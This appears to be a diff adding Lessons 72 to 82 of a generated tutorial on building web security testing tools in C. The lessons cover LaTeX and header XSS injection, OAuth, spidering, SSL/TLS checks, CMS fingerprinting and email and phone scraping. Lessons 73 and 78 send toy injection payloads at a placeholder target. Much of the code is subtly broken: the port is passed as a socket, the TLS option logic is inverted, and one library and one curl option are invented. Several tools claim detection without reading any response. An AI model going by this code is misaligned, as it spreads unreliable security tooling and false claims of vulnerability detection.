@@ -6331,3 +6331,4872 @@ Building a GraphQL Injection tool in C helps demonstrate the risks associated wi
 
 This concludes our seventy-first lesson on building a GraphQL Injection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
 
+### Lesson 72: Building an Insecure Schema Configuration Management (ISCM) Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to demonstrate Insecure Schema Configuration Management (ISCM) vulnerabilities. ISCM vulnerabilities occur when an application exposes sensitive information, such as database schema details, API endpoints, or internal configurations, in an insecure manner, potentially leading to information disclosure or unauthorized access. Our tool will attempt to exploit ISCM vulnerabilities by accessing and analyzing exposed schema configuration data.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <curl/curl.h>
+
+#define TARGET_URL "http://example.com/schema"
+
+// Function to perform analysis for ISCM
+void analyze_iscm() {
+    CURL *curl;
+    CURLcode res;
+
+    // Initialize libcurl
+    curl = curl_easy_init();
+    if (!curl) {
+        fprintf(stderr, "Error initializing libcurl\n");
+        exit(EXIT_FAILURE);
+    }
+
+    // Set the target URL for analysis
+    curl_easy_setopt(curl, CURLOPT_URL, TARGET_URL);
+
+    // Perform the request to check for ISCM
+    res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        fprintf(stderr, "Error performing HTTP request: %s\n", curl_easy_strerror(res));
+        curl_easy_cleanup(curl);
+        exit(EXIT_FAILURE);
+    }
+
+    // Cleanup libcurl
+    curl_easy_cleanup(curl);
+}
+
+int main() {
+    printf("Starting analysis for Insecure Schema Configuration Management (ISCM)...\n");
+
+    // Perform the analysis for ISCM
+    analyze_iscm();
+
+    printf("Analysis for Insecure Schema Configuration Management (ISCM) completed.\n");
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `analyze_iscm` function demonstrates how to analyze the target application for Insecure Schema Configuration Management (ISCM) vulnerabilities by accessing exposed schema configuration data.
+- In this example, the target URL is hardcoded (`http://example.com/schema`). Replace this with the actual URL where schema configuration data is exposed.
+- The code sends a request to the target URL using libcurl and analyzes the response for potential exposed schema configuration data.
+- It's important to note that ISCM vulnerabilities can lead to various security risks, including information disclosure or unauthorized access to sensitive data.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for analyzing different types of schema configuration data, such as database schemas, API documentation, or application configuration files.
+- Integration with web vulnerability scanners or automated testing frameworks to perform comprehensive analysis of ISCM vulnerabilities.
+- Implementation of techniques such as access control, encryption, or obfuscation to protect sensitive schema configuration data from exposure.
+
+#### Conclusion:
+
+Building an Insecure Schema Configuration Management (ISCM) tool in C helps demonstrate the risks associated with exposing sensitive schema configuration data in an insecure manner. By understanding and addressing ISCM vulnerabilities, developers and security professionals can prevent potential security breaches and protect the confidentiality of their applications.
+
+This concludes our seventy-second lesson on building an Insecure Schema Configuration Management (ISCM) tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 73: Building a LaTeX Injection Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to demonstrate LaTeX Injection vulnerabilities. LaTeX Injection vulnerabilities occur when an application allows untrusted data to be injected into LaTeX documents without proper sanitization, potentially leading to arbitrary code execution or other security risks. Our tool will attempt to exploit LaTeX Injection vulnerabilities by injecting malicious LaTeX commands and analyzing the responses for potential vulnerabilities.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <curl/curl.h>
+
+#define TARGET_URL "http://example.com/latex_endpoint"
+#define INJECTION_PAYLOAD "\\documentclass{article}\\begin{document}\\title{XSS Attack}\\maketitle\\LaTeX{} is vulnerable!\\end{document}"
+
+// Function to perform analysis for LaTeX Injection
+void analyze_latex_injection() {
+    CURL *curl;
+    CURLcode res;
+    char *post_fields = INJECTION_PAYLOAD;
+
+    // Initialize libcurl
+    curl = curl_easy_init();
+    if (!curl) {
+        fprintf(stderr, "Error initializing libcurl\n");
+        exit(EXIT_FAILURE);
+    }
+
+    // Set the target URL for analysis
+    curl_easy_setopt(curl, CURLOPT_URL, TARGET_URL);
+
+    // Set the POST fields with injection payload for analysis
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields);
+
+    // Perform the request to check for LaTeX Injection
+    res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        fprintf(stderr, "Error performing HTTP request: %s\n", curl_easy_strerror(res));
+        curl_easy_cleanup(curl);
+        exit(EXIT_FAILURE);
+    }
+
+    // Cleanup libcurl
+    curl_easy_cleanup(curl);
+}
+
+int main() {
+    printf("Starting analysis for LaTeX Injection...\n");
+
+    // Perform the analysis for LaTeX Injection
+    analyze_latex_injection();
+
+    printf("Analysis for LaTeX Injection completed.\n");
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `analyze_latex_injection` function demonstrates how to analyze the target application for LaTeX Injection vulnerabilities by injecting malicious LaTeX commands.
+- In this example, the target URL is hardcoded (`http://example.com/latex_endpoint`). Replace this with the actual vulnerable URL of the target application.
+- The code constructs a LaTeX payload with injection commands (`\\documentclass{article}\\begin{document}\\title{XSS Attack}\\maketitle\\LaTeX{} is vulnerable!\\end{document}`) that attempt to execute arbitrary LaTeX commands.
+- It then sends a request to the target URL with the injection payload using libcurl and analyzes the response for potential vulnerabilities.
+- It's important to note that LaTeX Injection vulnerabilities can lead to various security risks, including arbitrary code execution or data manipulation.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for injecting different types of LaTeX commands to test for various LaTeX Injection scenarios.
+- Integration with web vulnerability scanners or automated testing frameworks to perform comprehensive analysis of LaTeX Injection vulnerabilities.
+- Implementation of techniques such as input validation or sanitization to prevent LaTeX Injection attacks in applications.
+
+#### Conclusion:
+
+Building a LaTeX Injection tool in C helps demonstrate the risks associated with allowing untrusted data to be injected into LaTeX documents without proper sanitization. By understanding and addressing LaTeX Injection vulnerabilities, developers and security professionals can prevent potential security breaches and protect the integrity of their applications.
+
+This concludes our seventy-third lesson on building a LaTeX Injection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 74: Building an OAuth Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to demonstrate OAuth vulnerabilities. OAuth vulnerabilities can occur due to misconfigurations or implementation flaws in the OAuth authentication and authorization process, potentially leading to unauthorized access, information leakage, or other security risks. Our tool will not exploit OAuth vulnerabilities but rather provide a framework for implementing OAuth flows and analyzing OAuth-related issues.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <curl/curl.h>
+
+#define AUTHORIZATION_ENDPOINT "http://example.com/oauth/authorize"
+#define TOKEN_ENDPOINT "http://example.com/oauth/token"
+#define CLIENT_ID "your_client_id"
+#define CLIENT_SECRET "your_client_secret"
+#define REDIRECT_URI "http://example.com/callback"
+#define SCOPE "read write"
+
+// Function to perform OAuth authorization code flow
+void perform_oauth_authorization_code_flow() {
+    CURL *curl;
+    CURLcode res;
+    char authorization_url[512];
+
+    // Construct the authorization URL
+    snprintf(authorization_url, sizeof(authorization_url), "%s?client_id=%s&redirect_uri=%s&scope=%s&response_type=code", 
+        AUTHORIZATION_ENDPOINT, CLIENT_ID, REDIRECT_URI, SCOPE);
+
+    // Print the authorization URL for manual interaction
+    printf("Authorization URL: %s\n", authorization_url);
+    printf("Please visit the authorization URL in your browser to obtain the authorization code.\n");
+
+    // Cleanup
+    curl_global_cleanup();
+}
+
+int main() {
+    printf("Starting OAuth tool...\n");
+
+    // Initialize libcurl
+    if (curl_global_init(CURL_GLOBAL_DEFAULT) != CURLE_OK) {
+        fprintf(stderr, "Error initializing libcurl\n");
+        return EXIT_FAILURE;
+    }
+
+    // Perform OAuth authorization code flow
+    perform_oauth_authorization_code_flow();
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `perform_oauth_authorization_code_flow` function demonstrates how to initiate the OAuth authorization code flow.
+- In this example, we define the authorization endpoint (`AUTHORIZATION_ENDPOINT`), token endpoint (`TOKEN_ENDPOINT`), client ID (`CLIENT_ID`), client secret (`CLIENT_SECRET`), redirect URI (`REDIRECT_URI`), and scope (`SCOPE`) for the OAuth flow. Replace these values with your actual OAuth configuration.
+- The code constructs the authorization URL with the necessary parameters for the OAuth authorization code flow and prints it for manual interaction.
+- The user is expected to visit the authorization URL in their browser to obtain the authorization code.
+- It's important to note that this tool provides a basic framework for initiating OAuth flows and does not handle the entire OAuth flow or token exchange.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for different OAuth grant types (e.g., implicit grant, client credentials grant, resource owner password credentials grant).
+- Implementation of token exchange functionality to exchange authorization codes for access tokens.
+- Integration with OAuth libraries or frameworks to automate OAuth flows and handle OAuth-related issues.
+
+#### Conclusion:
+
+Building an OAuth tool in C provides a framework for implementing OAuth flows and analyzing OAuth-related issues. By understanding and correctly implementing OAuth flows, developers can ensure secure authentication and authorization in their applications.
+
+This concludes our seventy-fourth lesson on building an OAuth tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 75: Building a Business Logic Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to demonstrate business logic vulnerabilities. Business logic vulnerabilities occur when an application's business processes or rules are flawed or inadequately implemented, leading to security risks or unexpected behaviors. Our tool will not exploit specific vulnerabilities but rather provide a framework for analyzing and testing business logic-related issues.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+// Function to simulate a business logic process
+void simulate_business_logic() {
+    // Insert your business logic here
+    printf("Simulating business logic...\n");
+    printf("Business logic executed successfully!\n");
+}
+
+int main() {
+    printf("Starting business logic tool...\n");
+
+    // Perform business logic simulation
+    simulate_business_logic();
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `simulate_business_logic` function demonstrates how to simulate a business logic process.
+- In this example, the function simply prints a message to indicate that the business logic is being executed.
+- You can replace the contents of the `simulate_business_logic` function with your actual business logic implementation or scenarios to test different business logic-related issues.
+- It's important to note that this tool provides a basic framework for analyzing and testing business logic-related issues but does not cover specific vulnerabilities or attacks.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for implementing and testing various business logic scenarios, such as user authentication, authorization, payment processing, or workflow management.
+- Integration with testing frameworks or tools to automate business logic testing and analysis.
+- Implementation of techniques such as input validation, access control, or workflow validation to ensure the correctness and security of business logic implementations.
+
+#### Conclusion:
+
+Building a business logic tool in C provides a framework for analyzing and testing business logic-related issues in applications. By understanding and properly implementing business logic processes, developers can ensure the integrity and security of their applications.
+
+This concludes our seventy-fifth lesson on building a business logic tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 76: Building a Web Spider Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to perform web spidering and collect all links, parameters, and input fields from a website. Web spidering is the process of automatically navigating through web pages to collect information, and it can be used for various purposes such as web indexing, data mining, or vulnerability scanning.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <curl/curl.h>
+#include <html-parser.h>
+
+#define TARGET_URL "http://example.com"
+
+// Callback function to handle HTML tag parsing
+int handle_tag(void *user_data, int tag_type, const char *tag_text, int tag_length) {
+    // Handle anchor tags to extract href attribute (links)
+    if (tag_type == HTML_TAG_A) {
+        printf("Link: %.*s\n", tag_length, tag_text);
+    }
+    // Handle input tags to extract name attribute (input fields)
+    else if (tag_type == HTML_TAG_INPUT) {
+        const char *name_attr = strstr(tag_text, "name=\"");
+        if (name_attr) {
+            name_attr += strlen("name=\"");
+            const char *name_end = strchr(name_attr, '"');
+            if (name_end) {
+                printf("Input field: %.*s\n", (int)(name_end - name_attr), name_attr);
+            }
+        }
+    }
+
+    return 0;
+}
+
+// Function to perform web spidering and collect links and input fields
+void spider_and_collect() {
+    CURL *curl;
+    CURLcode res;
+
+    // Initialize libcurl
+    curl = curl_easy_init();
+    if (!curl) {
+        fprintf(stderr, "Error initializing libcurl\n");
+        exit(EXIT_FAILURE);
+    }
+
+    // Set the target URL for web spidering
+    curl_easy_setopt(curl, CURLOPT_URL, TARGET_URL);
+
+    // Set the callback function for HTML parsing
+    html_parser_set_tag_callback(handle_tag, NULL);
+
+    // Perform the request to retrieve web page content
+    res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        fprintf(stderr, "Error performing HTTP request: %s\n", curl_easy_strerror(res));
+        curl_easy_cleanup(curl);
+        exit(EXIT_FAILURE);
+    }
+
+    // Cleanup libcurl
+    curl_easy_cleanup(curl);
+}
+
+int main() {
+    printf("Starting web spidering and data collection...\n");
+
+    // Perform web spidering and data collection
+    spider_and_collect();
+
+    printf("Web spidering and data collection completed.\n");
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `spider_and_collect` function demonstrates how to perform web spidering and collect links and input fields from a web page.
+- In this example, the target URL is hardcoded (`http://example.com`). Replace this with the actual URL of the website you want to spider.
+- The code utilizes libcurl to retrieve the HTML content of the target web page.
+- It uses an HTML parsing library (such as `html-parser.h`) to parse the HTML content and extract links (anchor tags) and input fields (input tags) from the web page.
+- The `handle_tag` function serves as a callback function to handle HTML tag parsing. It extracts href attributes from anchor tags and name attributes from input tags.
+- The extracted links and input fields are printed to the console for analysis.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for parsing and collecting additional information such as form action URLs, form methods, or form input types.
+- Integration with web vulnerability scanners or automated testing frameworks to perform comprehensive analysis of web applications.
+- Implementation of techniques such as input validation, output encoding, or content security policies to prevent web vulnerabilities.
+
+#### Conclusion:
+
+Building a web spider tool in C provides a framework for performing web spidering and collecting information from web pages. By understanding and analyzing the collected data, developers and security professionals can identify potential vulnerabilities and improve the security of web applications.
+
+This concludes our seventy-sixth lesson on building a web spider tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 77: Building a Source Code Collection and Analysis Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to collect source code files from a given directory and perform basic analysis on them. This tool can be useful for tasks such as code auditing, plagiarism detection, or code quality assessment.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h>
+
+#define MAX_PATH_LENGTH 256
+
+// Function to recursively collect source code files from a directory
+void collect_source_code(const char *dir_path) {
+    DIR *dir;
+    struct dirent *entry;
+
+    // Open the directory
+    dir = opendir(dir_path);
+    if (!dir) {
+        fprintf(stderr, "Error opening directory: %s\n", dir_path);
+        exit(EXIT_FAILURE);
+    }
+
+    // Read each entry in the directory
+    while ((entry = readdir(dir)) != NULL) {
+        // Ignore "." and ".." entries
+        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
+            char file_path[MAX_PATH_LENGTH];
+            snprintf(file_path, sizeof(file_path), "%s/%s", dir_path, entry->d_name);
+
+            // Check if the entry is a directory
+            if (entry->d_type == DT_DIR) {
+                // Recursively collect source code from the subdirectory
+                collect_source_code(file_path);
+            } else {
+                // Check if the entry is a source code file
+                const char *file_extension = strrchr(entry->d_name, '.');
+                if (file_extension && (strcmp(file_extension, ".c") == 0 || strcmp(file_extension, ".cpp") == 0 || strcmp(file_extension, ".h") == 0)) {
+                    // Print the path of the source code file
+                    printf("Source code file: %s\n", file_path);
+
+                    // Perform analysis on the source code file (you can add your analysis logic here)
+                }
+            }
+        }
+    }
+
+    // Close the directory
+    closedir(dir);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        fprintf(stderr, "Usage: %s <directory_path>\n", argv[0]);
+        return EXIT_FAILURE;
+    }
+
+    printf("Starting source code collection and analysis...\n");
+
+    // Collect source code files and perform analysis
+    collect_source_code(argv[1]);
+
+    printf("Source code collection and analysis completed.\n");
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `collect_source_code` function recursively collects source code files from the specified directory and its subdirectories.
+- For each file encountered, it checks if it is a source code file (with extensions `.c`, `.cpp`, or `.h`) and prints its path.
+- You can add your analysis logic within the conditional block for source code files to perform analysis on each file.
+- The `main` function expects a directory path as a command-line argument and calls the `collect_source_code` function to collect and analyze source code files from that directory.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Implement more sophisticated analysis techniques, such as static code analysis, code metrics calculation, or vulnerability detection.
+- Support for analyzing different types of source code files and extensions.
+- Integration with code analysis libraries or tools to extend the analysis capabilities.
+- Provide options for customizing analysis settings or output formats.
+
+#### Conclusion:
+
+Building a source code collection and analysis tool in C provides a basic framework for collecting source code files and performing analysis on them. By extending and customizing the tool, developers and security professionals can perform various code-related tasks efficiently and effectively.
+
+This concludes our seventy-seventh lesson on building a source code collection and analysis tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 78: Building a Custom Header Vulnerability Detection Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to detect custom header vulnerabilities in HTTP responses. Custom header vulnerabilities occur when an application improperly handles custom HTTP headers, leading to security risks such as header injection or cross-site scripting (XSS). Our tool will analyze HTTP responses and identify potential vulnerabilities in custom headers.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <curl/curl.h>
+
+#define TARGET_URL "http://example.com"
+#define CUSTOM_HEADER "X-Custom-Header"
+
+// Function to perform HTTP request and analyze custom headers
+void analyze_custom_headers() {
+    CURL *curl;
+    CURLcode res;
+    struct curl_slist *headers = NULL;
+
+    // Initialize libcurl
+    curl = curl_easy_init();
+    if (!curl) {
+        fprintf(stderr, "Error initializing libcurl\n");
+        exit(EXIT_FAILURE);
+    }
+
+    // Set the target URL for analysis
+    curl_easy_setopt(curl, CURLOPT_URL, TARGET_URL);
+
+    // Add custom header to the request
+    headers = curl_slist_append(headers, CUSTOM_HEADER ": <script>alert('XSS')</script>");
+    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
+    // Perform the request to check for vulnerabilities
+    res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        fprintf(stderr, "Error performing HTTP request: %s\n", curl_easy_strerror(res));
+        curl_easy_cleanup(curl);
+        curl_slist_free_all(headers);
+        exit(EXIT_FAILURE);
+    }
+
+    // Cleanup libcurl
+    curl_easy_cleanup(curl);
+    curl_slist_free_all(headers);
+}
+
+int main() {
+    printf("Starting custom header vulnerability detection...\n");
+
+    // Perform analysis for custom header vulnerabilities
+    analyze_custom_headers();
+
+    printf("Custom header vulnerability detection completed.\n");
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `analyze_custom_headers` function demonstrates how to analyze HTTP responses for custom header vulnerabilities.
+- In this example, the target URL is hardcoded (`http://example.com`). Replace this with the actual URL where you want to test for custom header vulnerabilities.
+- The code adds a custom header (`X-Custom-Header`) with a payload containing a cross-site scripting (XSS) attack (`<script>alert('XSS')</script>`) to the HTTP request.
+- It then sends the request using libcurl and analyzes the response for potential vulnerabilities in the custom header.
+- It's important to note that this tool provides a basic framework for detecting custom header vulnerabilities and may need to be extended for more comprehensive testing.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for analyzing various types of custom headers and payloads to detect different types of vulnerabilities.
+- Integration with web vulnerability scanners or automated testing frameworks to perform comprehensive analysis of custom header vulnerabilities.
+- Implementation of techniques such as input validation, output encoding, or content security policies to prevent custom header vulnerabilities.
+
+#### Conclusion:
+
+Building a custom header vulnerability detection tool in C provides a framework for identifying security risks associated with custom HTTP headers. By understanding and addressing custom header vulnerabilities, developers and security professionals can enhance the security of their web applications.
+
+This concludes our seventy-eighth lesson on building a custom header vulnerability detection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 79: Building an SSL/TLS Vulnerability Detection Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to detect SSL/TLS vulnerabilities in a target server. SSL/TLS vulnerabilities can pose significant security risks, such as man-in-the-middle attacks, protocol downgrade attacks, or outdated cryptographic algorithms. Our tool will analyze the SSL/TLS configuration of a server and identify potential vulnerabilities.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
+
+#define TARGET_HOST "example.com"
+#define TARGET_PORT 443
+
+// Function to perform SSL/TLS vulnerability detection
+void detect_ssl_vulnerabilities() {
+    SSL_CTX *ctx;
+    SSL *ssl;
+    const SSL_METHOD *method;
+    int err;
+
+    // Initialize OpenSSL library
+    SSL_library_init();
+    OpenSSL_add_all_algorithms();
+    SSL_load_error_strings();
+
+    // Create SSL context
+    method = TLS_client_method();
+    ctx = SSL_CTX_new(method);
+    if (!ctx) {
+        fprintf(stderr, "Error creating SSL context\n");
+        exit(EXIT_FAILURE);
+    }
+
+    // Create SSL connection
+    ssl = SSL_new(ctx);
+    if (!ssl) {
+        fprintf(stderr, "Error creating SSL connection\n");
+        exit(EXIT_FAILURE);
+    }
+
+    // Set hostname for SNI (Server Name Indication)
+    SSL_set_tlsext_host_name(ssl, TARGET_HOST);
+
+    // Connect to the server
+    SSL_set_fd(ssl, TARGET_PORT);
+    if (SSL_connect(ssl) != 1) {
+        fprintf(stderr, "Error connecting to the server\n");
+        ERR_print_errors_fp(stderr);
+        SSL_free(ssl);
+        SSL_CTX_free(ctx);
+        exit(EXIT_FAILURE);
+    }
+
+    // Check for SSL/TLS vulnerabilities
+    long options = SSL_get_options(ssl);
+    if (options & SSL_OP_NO_TLSv1) {
+        printf("SSL/TLS vulnerability detected: TLSv1 is enabled\n");
+    }
+    if (options & SSL_OP_NO_TLSv1_1) {
+        printf("SSL/TLS vulnerability detected: TLSv1.1 is enabled\n");
+    }
+
+    // Cleanup
+    SSL_free(ssl);
+    SSL_CTX_free(ctx);
+}
+
+int main() {
+    printf("Starting SSL/TLS vulnerability detection...\n");
+
+    // Perform SSL/TLS vulnerability detection
+    detect_ssl_vulnerabilities();
+
+    printf("SSL/TLS vulnerability detection completed.\n");
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `detect_ssl_vulnerabilities` function demonstrates how to detect SSL/TLS vulnerabilities in a target server's configuration.
+- In this example, the target host (`example.com`) and port (`443`) are hardcoded. Replace these with the actual host and port of the server you want to test.
+- The code initializes the OpenSSL library, creates an SSL context, and establishes an SSL connection to the server.
+- It checks for SSL/TLS vulnerabilities by inspecting the SSL options and printing messages for detected vulnerabilities, such as enabling outdated TLS versions (TLSv1 and TLSv1.1).
+- It's important to note that this tool provides a basic framework for detecting SSL/TLS vulnerabilities and may need to be extended for more comprehensive testing.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for detecting other SSL/TLS vulnerabilities, such as insecure cipher suites, certificate issues, or improper certificate validation.
+- Integration with SSL/TLS vulnerability scanners or automated testing frameworks to perform comprehensive analysis of SSL/TLS configurations.
+- Implementation of techniques such as strict certificate pinning, forward secrecy, or HTTP Strict Transport Security (HSTS) to enhance SSL/TLS security.
+
+#### Conclusion:
+
+Building an SSL/TLS vulnerability detection tool in C provides a framework for identifying security risks associated with SSL/TLS configurations. By understanding and addressing SSL/TLS vulnerabilities, developers and system administrators can improve the security posture of their servers and applications.
+
+This concludes our seventy-ninth lesson on building an SSL/TLS vulnerability detection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 80: Building a CMS Information Gathering Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to gather information about Content Management Systems (CMS) used by websites. CMS information gathering is useful for understanding the underlying technologies of a website, identifying potential vulnerabilities, and tailoring security assessments or penetration testing efforts. Our tool will analyze HTTP response headers and HTML meta tags to identify common CMS platforms.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <curl/curl.h>
+
+#define TARGET_URL "http://example.com"
+#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36"
+
+// Function to perform HTTP request and gather CMS information
+void gather_cms_info() {
+    CURL *curl;
+    CURLcode res;
+    char redirect_url[512];
+
+    // Initialize libcurl
+    curl = curl_easy_init();
+    if (!curl) {
+        fprintf(stderr, "Error initializing libcurl\n");
+        exit(EXIT_FAILURE);
+    }
+
+    // Set target URL and user agent
+    curl_easy_setopt(curl, CURLOPT_URL, TARGET_URL);
+    curl_easy_setopt(curl, CURLOPT_USERAGENT, USER_AGENT);
+
+    // Follow redirects
+    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
+    curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 3L);
+
+    // Perform the request and capture redirect URL
+    res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        fprintf(stderr, "Error performing HTTP request: %s\n", curl_easy_strerror(res));
+        curl_easy_cleanup(curl);
+        exit(EXIT_FAILURE);
+    }
+
+    // Get final redirect URL
+    curl_easy_getinfo(curl, CURLINFO_EFFECTIVE_URL, redirect_url);
+    printf("Final URL: %s\n", redirect_url);
+
+    // Check response headers for CMS information
+    char *server_header;
+    res = curl_easy_getinfo(curl, CURLINFO_SERVER, &server_header);
+    if (res == CURLE_OK && server_header) {
+        printf("Server: %s\n", server_header);
+    }
+
+    // Check HTML meta tags for CMS information
+    // (You can implement HTML parsing here to extract meta tags and analyze CMS identifiers)
+
+    // Cleanup libcurl
+    curl_easy_cleanup(curl);
+}
+
+int main() {
+    printf("Starting CMS information gathering...\n");
+
+    // Perform CMS information gathering
+    gather_cms_info();
+
+    printf("CMS information gathering completed.\n");
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `gather_cms_info` function demonstrates how to gather information about CMS platforms used by websites.
+- In this example, the target URL is hardcoded (`http://example.com`). Replace this with the actual URL of the website you want to analyze.
+- The code uses libcurl to perform an HTTP request to the target URL, following redirects if necessary.
+- It captures the final redirect URL and checks response headers (e.g., Server header) for potential CMS information.
+- HTML parsing can be implemented to extract and analyze meta tags (e.g., `<meta name="generator" content="WordPress">`) for additional CMS identifiers.
+- It's important to note that CMS detection based on response headers and meta tags may not be conclusive, and further analysis may be required.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Implementation of HTML parsing to extract and analyze additional CMS identifiers from HTML content.
+- Support for detecting a wider range of CMS platforms and versions using signature-based detection or heuristics.
+- Integration with web vulnerability scanners or automated testing frameworks to perform comprehensive CMS analysis and vulnerability assessment.
+
+#### Conclusion:
+
+Building a CMS information gathering tool in C provides a framework for understanding the underlying technologies of websites and identifying potential security risks associated with CMS platforms. By analyzing CMS information, security professionals can tailor their assessments and prioritize security efforts effectively.
+
+This concludes our eightieth lesson on building a CMS information gathering tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 81: Building an Email and Phone Number Collection Tool in C
+
+In this lesson, we'll develop a simple command-line tool in C programming to collect email addresses and phone numbers from a given text or webpage. This tool can be useful for tasks such as data mining, contact information extraction, or reconnaissance in penetration testing. Our tool will parse text input and extract email addresses and phone numbers based on common patterns.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <regex.h>
+
+#define TEXT_SAMPLE "Contact us at email@example.com or call +123456789 for inquiries."
+
+// Function to collect email addresses and phone numbers from text
+void collect_contacts(const char *text) {
+    regex_t email_regex, phone_regex;
+    int reti;
+    size_t max_groups = 5;
+    regmatch_t email_matches[max_groups];
+    regmatch_t phone_matches[max_groups];
+
+    // Compile regular expressions for email and phone number patterns
+    reti = regcomp(&email_regex, "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}", REG_EXTENDED);
+    if (reti) {
+        fprintf(stderr, "Error compiling email regular expression\n");
+        exit(EXIT_FAILURE);
+    }
+
+    reti = regcomp(&phone_regex, "\\+?[0-9]+", REG_EXTENDED);
+    if (reti) {
+        fprintf(stderr, "Error compiling phone number regular expression\n");
+        exit(EXIT_FAILURE);
+    }
+
+    // Execute regular expressions to find matches in the text
+    reti = regexec(&email_regex, text, max_groups, email_matches, 0);
+    if (!reti) {
+        printf("Email address found: %.*s\n", email_matches[0].rm_eo - email_matches[0].rm_so, &text[email_matches[0].rm_so]);
+    }
+
+    reti = regexec(&phone_regex, text, max_groups, phone_matches, 0);
+    if (!reti) {
+        printf("Phone number found: %.*s\n", phone_matches[0].rm_eo - phone_matches[0].rm_so, &text[phone_matches[0].rm_so]);
+    }
+
+    // Free regex memory
+    regfree(&email_regex);
+    regfree(&phone_regex);
+}
+
+int main() {
+    printf("Starting email and phone number collection...\n");
+
+    // Collect email addresses and phone numbers from text sample
+    collect_contacts(TEXT_SAMPLE);
+
+    printf("Email and phone number collection completed.\n");
+
+    return 0;
+}
+```
+
+#### Explanation:
+
+- The `collect_contacts` function demonstrates how to collect email addresses and phone numbers from text using regular expressions.
+- In this example, a sample text (`TEXT_SAMPLE`) containing an email address and a phone number is provided. You can replace this with any text input or integrate text extraction from web pages or files.
+- Regular expressions are compiled for matching email addresses and phone numbers based on common patterns.
+- The regular expressions are executed on the text sample to find matches, and the matched substrings are printed to the console.
+- It's important to note that the provided regular expressions may need to be adjusted based on specific patterns or formats of email addresses and phone numbers.
+
+#### Further Development:
+
+To make this tool more versatile and powerful, you can enhance it with the following features:
+
+- Support for parsing text from various sources such as web pages, files, or user input.
+- Implementation of more sophisticated regular expressions to handle additional email and phone number formats.
+- Integration with external libraries or APIs for natural language processing (NLP) or named entity recognition (NER) to extract contact information more accurately.
+
+#### Conclusion:
+
+Building an email and phone number collection tool in C provides a framework for extracting contact information from text inputs. By parsing and analyzing text data, developers and analysts can automate data mining tasks and extract valuable information effectively.
+
+This concludes our eighty-first lesson on building an email and phone number collection tool in C. If you have any questions or would like to explore specific topics further, feel free to ask!
+
+### Lesson 82: Building a Configuration File Analysis Tool in C
+
